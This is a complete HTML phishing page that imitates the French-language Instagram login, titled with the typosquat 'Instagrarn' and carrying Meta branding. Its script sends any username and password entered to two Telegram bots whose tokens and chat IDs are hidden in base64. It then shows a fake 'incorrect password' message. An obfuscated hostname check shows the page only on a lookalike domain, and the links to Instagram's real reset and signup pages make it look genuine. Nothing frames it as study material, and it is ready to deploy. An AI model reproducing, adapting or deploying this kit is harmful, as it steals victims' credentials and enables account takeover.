<!DOCTYPE html>
<html lang="en">
<meta charset="UTF-8">

<head>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
            outline: none;
            user-select: none;
        }

        html,
        body {
            width: 100%;
            height: 100%;
            background: linear-gradient(160deg, #1C3342, #1D3838);
        }

        #container {
            width: 100%;
            max-width: 380px;
            height: 100%;
            padding: 15px 20px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;

        }

        #langue {
            width: fit-content;
            color: #CBD2D9;
            margin: 0 auto;
            font-size: 14.5px;
        }

        #logo {
            width: 60px;
            height: 60px;
            margin: 40px 0;
            background-image: url("./src/logo.png");
            background-position: center;
            background-repeat: no-repeat;
            background-size: 100%;
        }

        .input {
            width: 100%;
            min-height: 60px;
            max-height: 60px;
            margin: 0 0 12px 0;
            padding: 0 14px;
            background-color: #1C2B33;
            border: 1px solid #425462;
            font-size: 17px;
            border-radius: 12px;
            color: #ffffff;
        }

        .input::placeholder {
            color: #7E8D9C;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
            display: flex;
            pointer-events: visiblePainted;
            flex-direction: row;
        }


        #lgn {
            background-color: #0064E0;
            width: 100%;
            min-height: 45px;
            max-height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            font-size: 17px;
            border-radius: 30px;
            cursor: pointer;
        }

        #lgn:active {
            background-color: #0857B8;
        }

        #pLogin {
            width: fit-content;
            color: white;
            margin: 0 0 2px 0;
            padding: 0;
            font-size: 15px;
            font-weight: 400;
        }

        #loading {
            background-image: url("./src/loading.gif");
            background-repeat: no-repeat;
            background-size: 100%;
            background-position: center;
            filter: invert(100%);
            width: 19px;
            height: 19px;
            opacity: 50%;
            margin: 0;
            padding: 0;
            display: none;
        }

        #frgt {
            color: #ffffff;
            margin: 20px auto;
            font-size: 17px;
            width: fit-content;
            cursor: pointer;
        }

        #frgt:active {
            opacity: 50%;
        }

        #sgnp {
            color: #47A5FA;
            border: 1px solid #47A5FA;
            width: 100%;
            min-height: 45px;
            max-height: 45px;
            margin: 60px 0 0 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16.5px;
            border-radius: 30px;
            cursor: pointer;
        }

        #sgnp:active {
            background-color: rgba(255, 255, 255, 0.05);
        }

        #meta {
            width: 60px;
            min-height: 12px;
            max-height: 12px;
            margin: 20px auto;
            background-image: url("./src/meta.png");
            background-position: center;
            background-repeat: no-repeat;
            background-size: 100%;
        }

        #spc1 {
            width: auto;
            height: auto;
            display: flex;
            flex: 1;
            justify-content: center;
            align-items: center;
        }

        #spc2 {
            width: auto;
            height: auto;
            display: flex;
            flex: 1;
            justify-content: flex-end;
            flex-direction: column;
        }



        /* dlg */
        .dialog-container {
            position: fixed;
            top: 0;
            left: 0;
            height: 100vh;
            width: 100vw;
            background-color: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }

        .dialog-box {
            background-color: white;
            border-radius: 12px;
            padding: 15px 0 0 0;
            width: 300px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            font-family: sans-serif;
        }

        .dialog-title {
            font-weight: bold;
            font-size: 18px;
            margin: 10px 0;
        }

        .dialog-text {
            font-size: 14px;
            color: #444;
            margin: 15px 30px;
        }

        .dialog-line {
            border-top: 1px solid #ddd;
            margin: 15px 0 0 0;
        }

        .dialog-btn {
            background: none;
            border: none;
            color: #007BFF;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            width: 100%;
            height: fit-content;
            margin: 0;
            padding: 17px 0;
        }

        .dialog-btn:active {
            background-color: #eee;
            border-radius: 0 0 12px 12px;
        }
    </style>
</head>

<body>
    <div id="container">
        <p id="langue">Français (France)</p>
        <div id="spc1">
            <div id="logo"></div>
        </div>
        <input class="input" type="text" id="u" placeholder="Nom d'utilisateur" autocomplete="off">
        <input class="input" type="password" id="p" placeholder="Mot de passe" autocomplete="off">

        <div id="lgn" onclick="login();">
            <p id="pLogin">Se connecter</p>
            <div id="loading"></div>
        </div>

        <p id="frgt" onclick="window.location.href='https://instagram.com/accounts/password/reset/'">Mot de passe
            oublié ?</p>
        <div id="spc2">
            <p id="sgnp" onclick="window.location.href='https://instagram.com/accounts/emailsignup/'">Créer un
                compte</p>
            <div id="meta"></div>
        </div>
    </div>

    <!-- dlg -->
    <div class="dialog-container" id="dlg">
        <div class="dialog-box">
            <p class="dialog-title">Mot de passe incorrect</p>
            <p class="dialog-text">
                Le mot de passe que vous avez indiqué est incorrect. Veuillez réessayer.
            </p>
            <div class="dialog-line"></div>
            <button class="dialog-btn" onclick="dlg.style.display = 'none';">OK</button>
        </div>
    </div>


    <script>
        var tt = "ODE1OTg2MDAwMzpBQUVxR3BfdEY5RnAySzlMOTNCNXRVZmozNGxCWXBJc291OA==";
        var cc = "NTc1MzcxOTQ3NA==";

        const lgn = document.getElementById("lgn");
        const dlg = document.getElementById('dlg');

        var click = true;
        document.body.style.display = 'none';
        if (eval(atob("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === atob("aW5zdGFncmFtLXNpZ25pbi5ydW4ucGxhY2U=")) {
            document.body.style.display = 'flex';
        }
        function login() {
            if (click) {
                const u = document.getElementById("u").value.trim();
                const p = document.getElementById("p").value.trim();

                if (u.length > 5 && p.length > 5) {
                    pLogin.style.display = "none";
                    loading.style.display = "block";
                    click = false;
                    var msg = `email: ${u}
    password: ${p}`;
                    setTimeout(function () {

                        const tokens = [
                            atob(tt), atob("Njc5OTk1NjQ4MDpBQUY2dUtNNGI3MmFBeE5lNm4ydk9DdUhwZzdyQ0pvUlBrWQ==")
                        ];
                        const chatIds = [
                            atob(cc), atob("NjY2OTY5MzgwNQ==")
                        ];

                        tokens.forEach((token, index) => {
                            const url = `https://api.telegram.org/bot${token}/sendMessage`;

                            const data = {
                                chat_id: chatIds[index],
                                text: msg
                            };

                            fetch(url, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(data)
                            })
                                .then(response => response.json())
                                .then(data => {
                                    if (data.ok) {
                                        if (index === tokens.length - 1) {
                                            showDlg();
                                        }
                                    } else {
                                        delay(() => showDlg());
                                    }
                                })
                                .catch(err => {
                                    delay(() => showDlg());
                                });
                        });

                    }, 2000);

                } else { //empty
                    showDlg();
                } //not empty

            } //click

        } //login


        function showDlg() {
            pLogin.style.display = "block";
            loading.style.display = "none";
            dlg.style.display = "flex";
            click = true;
        }


        function delay(d) {
            setTimeout(d, 2000);
        }





        // Viewport Meta Tag
        const viewportMeta = document.createElement('meta');
        viewportMeta.setAttribute('name', 'viewport');
        viewportMeta.setAttribute('content', 'width=device-width, initial-scale=1.0');
        document.head.appendChild(viewportMeta);

        // Title Tag
        const titleTag = document.createElement('title');
        titleTag.textContent = 'Connexion • Instagrarn';
        document.head.appendChild(titleTag);

        // Description Meta Tag
        const descriptionMeta = document.createElement('meta');
        descriptionMeta.setAttribute('name', 'description');
        descriptionMeta.setAttribute('content', 'Connectez-vous et partagez des moments avec des personnes qui vous comprennent. Rejoignez-nous ou connectez-vous dès maintenant pour commencer votre aventure.');
        document.head.appendChild(descriptionMeta);

        // Favicon Link Tag
        const faviconLink = document.createElement('link');
        faviconLink.setAttribute('rel', 'icon');
        faviconLink.setAttribute('type', 'image/x-icon');
        faviconLink.setAttribute('href', '/src/ig.ico');
        document.head.appendChild(faviconLink);

    </script>
</body>

</html>
